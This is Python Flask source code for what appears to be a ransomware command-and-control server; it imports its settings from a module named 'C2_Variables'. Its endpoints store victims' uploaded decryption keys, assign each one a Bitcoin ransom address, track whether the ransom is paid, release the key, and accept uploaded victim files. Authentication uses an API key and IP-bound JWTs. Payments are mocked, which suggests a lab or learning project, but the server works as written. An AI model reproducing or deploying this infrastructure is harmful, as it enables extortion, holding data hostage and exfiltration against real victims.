from flask import Flask, request, jsonify, send_file
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from flask_limiter.errors import RateLimitExceeded
from werkzeug.utils import secure_filename
import os
import logging
import jwt
import uuid
from datetime import timedelta
import json
import sys
from datetime import datetime, timezone
import sqlite3
import random
from C2_Variables import DB_PATH, KEY_STORAGE_DIR, FILE_STORAGE_DIR, api_key, seconds_left, jwt_key, extesions
from Threading import start_mock_payment, start_remove_expired_keys
from Database import init_db
from Validation import check_keys


####################################################################################################################

app = Flask(__name__)

limiter = Limiter(
    get_remote_address,
    app=app,
    default_limits=[]
)

logging.getLogger('werkzeug').setLevel(logging.ERROR)

logging.basicConfig(
    level=logging.INFO,
    format='%(message)s',
    handlers=[
        logging.FileHandler('log.json'), # This will pump out into .json file
        logging.StreamHandler(sys.stdout) # This will pump out into terminal
    ]
)

####################################################################################################################

init_db()
start_remove_expired_keys()
start_mock_payment()

####################################################################################################################

@app.route('/create_session', methods=['POST'])
@limiter.limit("1 per minute")
def create_jwt_session():
    try:
        received_api_key = request.headers.get('API-KEY')
        if received_api_key != api_key:
            return jsonify({"error": "Invalid API Key"}), 403

        expiration = datetime.now(timezone.utc) + timedelta(seconds = seconds_left)
        unique_uuid = str(uuid.uuid4())
        payload = {
            "exp": expiration,
            "iat": datetime.now(timezone.utc).timestamp(),
            "ip": request.remote_addr,
            "uuid": unique_uuid
        }
        session_token = jwt.encode(payload, jwt_key, algorithm="HS256")

        return jsonify({"session_token": session_token, "uuid": unique_uuid})
    except Exception as e:
        print(f"Error: {e}") # Debug Message
        return jsonify({"Error": "Error Happen"}), 500

####################################################################################################################

@app.route('/upload_key', methods=['POST']) 
@limiter.limit("3 per minute")
def upload_key():
    received_api_key = request.headers.get('API-KEY')
    session_token = request.headers.get('Session-Token')
    unique_uuid = request.headers.get('uuid')
    received_ip = request.remote_addr
    decode_jwt = jwt.decode(session_token, jwt_key, algorithms=["HS256"])
    jwt_ip = decode_jwt.get("ip")
    jwt_uuid = decode_jwt.get("uuid")
    validation_failed = check_keys(received_api_key, session_token, jwt_ip, received_ip, unique_uuid, jwt_uuid)
    if validation_failed:
        return validation_failed

    key_file = request.files.get('key')
    if not key_file:
        return jsonify({"error": "No key provided"}), 400

    key_filename = secure_filename(key_file.filename)
    if not key_filename.endswith(".pem"):
        return jsonify({"error": "File type"}), 400
    
    key_path = os.path.join(KEY_STORAGE_DIR, key_filename)
    correct_key_path = os.path.realpath(key_path)
    if not correct_key_path.startswith(os.path.realpath(KEY_STORAGE_DIR)):
        return jsonify({"error": "Filename"}), 400

    btc_address = f"mock_btc_{random.randint(1000,9999)}"

    try:
        key_file.save(correct_key_path)
        os.chmod(correct_key_path, 0o600) # Changes file to read and write for only owner
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('INSERT OR REPLACE INTO payments (unique_id, btc_address, paid) VALUES (?, ?, ?)',
                  (key_filename, btc_address, False))
        conn.commit()
        conn.close()
        return jsonify({"file": key_filename, "btc_address": btc_address}), 200
    except Exception as e:
        print(f"Error: {e}") # Debug Message
        return jsonify({"Error": "Error Happen"}), 500

####################################################################################################################

@app.route('/get_key/<unique_id>', methods=['GET'])
@limiter.limit("3 per minute")
def get_key(unique_id):
    received_api_key = request.headers.get('API-KEY')
    session_token = request.headers.get('Session-Token')
    unique_uuid = request.headers.get('uuid')
    received_ip = request.remote_addr
    decode_jwt = jwt.decode(session_token, jwt_key, algorithms=["HS256"])
    jwt_ip = decode_jwt.get("ip")
    jwt_uuid = decode_jwt.get("uuid")
    validation_failed = check_keys(received_api_key, session_token, jwt_ip, received_ip, unique_uuid, jwt_uuid)
    if validation_failed:
        return validation_failed

    unique_id_safe = secure_filename(unique_id)
    key_path = os.path.join(KEY_STORAGE_DIR, unique_id_safe)
    correct_key_path = os.path.realpath(key_path)
    if not correct_key_path.startswith(os.path.realpath(KEY_STORAGE_DIR)):
        return jsonify({"error": "File path"}), 400
    if not os.path.exists(correct_key_path):
        return jsonify({"error": "Filename not found"}), 404

    try:
        return send_file(
            key_path,
            mimetype='application/x-pem-file',
            as_attachment=True,
            download_name=unique_id
        )
    except Exception as e:
        print(f"Error: {e}") # Debug Message
        return jsonify({"Error": "Error Happen"}), 500

####################################################################################################################

@app.route('/payment_status/<unique_id>', methods=['GET'])
@limiter.limit("5 per minute")
def payment_status(unique_id):
    received_api_key = request.headers.get('API-KEY')
    session_token = request.headers.get('Session-Token')
    unique_uuid = request.headers.get('uuid')
    received_ip = request.remote_addr
    decode_jwt = jwt.decode(session_token, jwt_key, algorithms=["HS256"])
    jwt_ip = decode_jwt.get("ip")
    jwt_uuid = decode_jwt.get("uuid")
    validation_failed = check_keys(received_api_key, session_token, jwt_ip, received_ip, unique_uuid, jwt_uuid)
    if validation_failed:
        return validation_failed
    
    unique_id_safe = secure_filename(unique_id)
    key_path = os.path.join(KEY_STORAGE_DIR, unique_id_safe)
    correct_key_path = os.path.realpath(key_path)
    if not correct_key_path.startswith(os.path.realpath(KEY_STORAGE_DIR)):
        return jsonify({"error": "File path"}), 400
    if not os.path.exists(correct_key_path):
        return jsonify({"error": "Filename not found"}), 404
    
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('SELECT paid FROM payments WHERE unique_id = ?', (unique_id,))
        result = c.fetchone()
        conn.close()

        if result is None:
            return jsonify({"error": "Unique ID not found"}), 404

        paid = bool(result[0])
        return jsonify({"unique_id": unique_id, "paid": paid}), 200
    except Exception as e:
        print(f"Error: {e}") # Debug Message
        return jsonify({"Error": "Error Happen"}), 500

####################################################################################################################

@app.route('/upload_file', methods=['POST']) 
def upload_file():
    received_api_key = request.headers.get('API-KEY')
    session_token = request.headers.get('Session-Token')
    unique_uuid = request.headers.get('uuid')
    received_ip = request.remote_addr
    decode_jwt = jwt.decode(session_token, jwt_key, algorithms=["HS256"])
    jwt_ip = decode_jwt.get("ip")
    jwt_uuid = decode_jwt.get("uuid")
    validation_failed = check_keys(received_api_key, session_token, jwt_ip, received_ip, unique_uuid, jwt_uuid)
    if validation_failed:
        return validation_failed

    uploaded_file = request.files.get('file')
    if not uploaded_file:
        return jsonify({"error": "No file provided"}), 400

    key_filename = secure_filename(uploaded_file.filename)
    if not key_filename.endswith(tuple(extesions)):
        return jsonify({"error": "File type"}), 400
    
    uploaded_file_path = os.path.join(FILE_STORAGE_DIR, key_filename)
    correct_uploaded_file_path = os.path.realpath(uploaded_file_path)
    if not correct_uploaded_file_path.startswith(os.path.realpath(FILE_STORAGE_DIR)):
        return jsonify({"error": "Filename"}), 400

    try:
        uploaded_file.save(correct_uploaded_file_path)
        os.chmod(correct_uploaded_file_path, 0o600) # Changes file to read and write for only owner
        return jsonify({"file": "uploaded"}), 200
    except Exception as e:
        print(f"Error: {e}") # Debug Message
        return jsonify({"Error": "Error Happen"}), 500

####################################################################################################################

@app.errorhandler(RateLimitExceeded)
def ratelimit_handler(e):
    return jsonify(error="rate limit exceeded"), 429

####################################################################################################################

@app.after_request
def log_response(response):
    response_data = {}
    if response.is_json:
        response_data = response.get_json()
    log_entry = {
        "time": datetime.now(timezone.utc).isoformat(),
        "ip": request.remote_addr,
        "method": request.method,
        "endpoint": request.path,
        "status": response.status_code,
        "response": response_data
    }
    logging.info(json.dumps(log_entry))
    return response

####################################################################################################################

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

####################################################################################################################